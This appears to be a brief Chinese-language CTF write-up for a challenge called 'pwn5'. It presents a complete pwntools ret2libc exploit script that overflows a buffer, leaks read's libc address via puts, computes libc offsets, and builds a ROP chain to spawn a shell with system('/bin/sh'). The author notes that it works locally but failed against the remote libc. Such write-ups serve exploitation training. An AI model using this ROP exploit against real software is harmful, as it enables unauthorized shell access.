![[pwn5]]
![[Pasted image 20240826220606.png]]
一道普通的ret2libc，做法常规
**注意点在于远程的libc版本高，非\x7f打头，故没做出
本地易通

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
p = process('./pwn5')
# p = remote("boom.01130328.xyz", 37189)
elf = ELF('./pwn5')
  
rdi = 0x40117e
ret = 0x40101a

puts_plt = elf.plt['puts']
read_got = elf.got['read']
main_addr = elf.symbols['main']

payload = b'a' * (0x10 + 8) + p64(rdi) + p64(read_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(b'you?', payload)
# addr = p.recvuntil(b'\x7f')
addr = p.recvline()
addr1 = p.recvline()
addr2 = p.recvline() #获取到addr2为泄露的地址
print(addr, addr1, addr2)
print('-------------------------------------')
read_real = u64(addr2[-8:-1].ljust(8, b'\x00'))
#read_real = u64(p.recvline()[:-1].ljust(8,'\x00'))
from LibcSearcher import LibcSearcher
print(hex(read_real))

'''libc = LibcSearcher('read', read_real) #search不到，自己测试出来是libc6-amd64_2.37-13_i386
libc_base = read_real - libc.dump('read')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')'''

libc_base = read_real - 0xf7a50
system = libc_base + 0x4c920
binsh = libc_base + 0x19604f

payload = flat(['a' * (0x18), ret, rdi, binsh, system])
p.sendline(payload)
p.interactive()
```